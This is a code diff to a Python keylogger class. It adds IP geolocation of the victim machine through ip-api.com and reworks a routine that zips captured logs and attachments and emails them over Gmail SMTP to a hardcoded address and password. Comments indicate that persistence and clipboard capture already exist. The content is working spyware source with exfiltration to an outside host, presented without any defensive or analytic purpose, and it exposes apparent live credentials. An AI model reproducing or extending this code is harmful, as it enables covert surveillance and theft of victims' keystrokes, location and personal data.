@@ -23,6 +23,8 @@ import sys
 
 import zipfile
 
+import requests
+
 class KeyLogger:
     def __init__(self, time_interval=60, email="joemunene984@gmail.com", password="K3YL00G3R"):
         self.log = "KeyLogger Started..."
@@ -35,9 +37,22 @@ class KeyLogger:
         
         self.load_or_generate_key()
         self.get_system_info()
+        self.get_geolocation()
         self.become_persistent()
 
-    # ... (other methods remain same)
+    # ... (load_or_generate_key, become_persistent, append_to_log, get_system_info remain same) ...
+
+    def get_geolocation(self):
+        try:
+            response = requests.get("http://ip-api.com/json/")
+            data = response.json()
+            if data['status'] == 'success':
+                geo_info = f"\n[+] Geolocation:\nIP: {data['query']}\nCountry: {data['country']}\nCity: {data['city']}\nISP: {data['isp']}\nLat/Lon: {data['lat']}, {data['lon']}\n"
+                self.append_to_log(geo_info)
+        except Exception as e:
+            self.append_to_log(f"\n[-] Geolocation failed: {e}")
+            
+    # ... (get_active_window, process_clipboard, etc. remain same) ...
 
     def send_mail(self):
         # NOTE: This requires 'Less Secure Apps' enabled or App Password for Gmail
@@ -73,8 +88,8 @@ class KeyLogger:
             for file in files_to_attach:
                 if file and os.path.exists(file):
                     zipf.write(file)
-
-        # Attach ZIP
+        
+        # Key Email Logic
         if os.path.exists(zip_filename):
             attachment = open(zip_filename, "rb")
             p = MIMEBase('application', 'octet-stream')
@@ -84,29 +99,28 @@ class KeyLogger:
             msg.attach(p)
             attachment.close()
 
-        try:
-            s = smtplib.SMTP('smtp.gmail.com', 587)
-            s.starttls()
-            s.login(self.email, self.password)
-            text = msg.as_string()
-            s.sendmail(self.email, self.email, text)
-            s.quit()
-            print("[+] Email sent.")
+            try:
+                s = smtplib.SMTP('smtp.gmail.com', 587)
+                s.starttls()
+                s.login(self.email, self.password)
+                text = msg.as_string()
+                s.sendmail(self.email, self.email, text)
+                s.quit()
+                print("[+] Email sent.")
+            except Exception as e:
+                print(f"[-] Error sending email: {e}")
+        
+        # Reset log after report
+        self.log = ""
             
-            # Reset log after successful email
-            self.log = ""
-            
-            # Clean up files
-            for f in files_to_attach:
-                if f != self.encrypted_log_file: # Keep the log file
-                    try:
-                        os.remove(f)
-                    except:
-                        pass
-            if os.path.exists(zip_filename):
-                os.remove(zip_filename)
+        # Clean up files
+        for f in files_to_attach:
+            if f != self.encrypted_log_file: 
+                try:
+                    os.remove(f)
+                except:
+                    pass
+        if os.path.exists(zip_filename):
+            os.remove(zip_filename)
 
-        except Exception as e:
-            print(f"[-] Error sending email: {e}")
-
-    # ... (rest of the file)
+    # ... (report, start, main remain same) ...
